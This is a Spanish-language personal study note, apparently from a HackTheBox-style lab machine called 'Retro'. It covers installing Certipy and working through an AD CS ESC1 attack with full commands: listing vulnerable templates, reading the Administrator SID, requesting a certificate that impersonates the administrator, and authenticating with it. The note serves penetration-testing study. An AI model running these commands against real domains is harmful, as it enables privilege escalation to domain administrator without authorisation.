#certipy 

----
[Link](https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation)
Es una herramienta de **auditoría y explotación de servicios de Active Directory Certificate Services (AD CS)**.  
AD CS es la infraestructura de certificados de Microsoft: permite emitir certificados digitales para autenticación, cifrado, firmas, etc.  
Cuando está mal configurada, puede abrir la puerta a ataques que permitan escalar privilegios dentro de un dominio.

-----
# Instalacion y ubicacion

```
pip install certipy-ad
pip3 install certipy-ad
```


```
find / -name certipy 2>/dev/null
```

Como vemos lo tenemos en la ruta */home/bunzo/.local/bin/certipy* asi que lo vamos a ejecutar con `python3 /home/bunzo/.local/bin/certipy`
![[Retro21.png]]

---

# Uso con ESC1


Vamos a usar este [articulo](https://www-hackingarticles-in.translate.goog/a-detailed-guide-on-certipy/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es) para usar el [[certipy]] y escalar prilegios


```
python3 /home/bunzo/.local/bin/certipy find -username 'BANKING$'@retro.vl -password 'exploit' -dc-ip 10.129.234.44 -vulnerable -enable -stdout
```
*Parametros:* 
	`find` Es para buscar 
	`-username` Usuario
	`-password` Contraseña
	`-dc-ip` Es la ip victima
	`-vulnerable` Indica que queremos detectar los templates con configuraciones inseguras
	`-enable` Si la CA está deshabilitada, pide que se habilite la inscripción (requiere que la cuenta tenga permisos suficientes).
	`-stdout` Muestra toda la informacion directamente en la salida edl comando

![[Retro22.png]]
![[Retro23.png]]
Nos da el template que se llama *RetroClients* y el CA que es *retro-DC-CA*. Y nos indica que hay una vulnerabilidad *ESC1*

Con este comando estamos intentando leer la ifnormacion de la cuienta Administrator utilizando las credenciales del usuario BANKING$

```
python3 /home/bunzo/.local/bin/certipy account -u 'BANKING$' -p exploit -dc-ip 10.129.234.44 -target 10.129.234.44 -user Administrator read
```
*Parametros:*
	`account` Indica que se va a trabajar con **cuentas de Active Directory** (crear, leer, modificar, eliminar atributos, etc.).
	`-user Administrator` Especifica que querés actuar sobre la cuenta Administrator.
	`read`Acción: leer atributos de esa cuenta (por ejemplo, descripción, SID, grupos, SPNs, etc.).
![[Retro24.png]]
Nos da el objectSid que lo vamos a usar a posteriori


Ahora con todos los datos que ya recopilamos vamos a hacer la solicitud para descargar el certificado

```
python3 /home/bunzo/.local/bin/certipy req -u 'BANKING$' -p exploit -dc-ip 10.129.234.44 -target 10.129.234.44 -ca retro-DC-CA -template 'RetroClients' -upn 'administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500' -key-size 4096 -debug
```
*Parametros:*
	`req` Solicita un certificado a la CA
	`-ca ` Nombre de la Certificate Authority en el dominio.
	`-template` Plantilla de certificado que se va a usar; en laboratorios suele ser mal configurada para permitir enrollment de cualquier usuario.
	`-upn` Usuario objetivo que queremos impersonar con el certificado
	`-sid` SID del usuario objetivo, para que el certificado tenga la identidad correcta.
	`-key-size 4096` Si no poniamos este valor, nos daba un error por el tamaño de la key
	`-debug` Muestra información detallada de la operación para diagnóstico.

![[Retro28.png]]

Ahora nos vamos a utentificar en el dominio usando el certificado enves ed una contraseña tradicional
```
python3 /home/bunzo/.local/bin/certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44
```
*Parametros:*
	`auth` Indica que se va a utentificar con un certificado
	`-pfx administrator.pfx` Es para indicar el archivo que contiene el certificado

![[Retro29.png]]

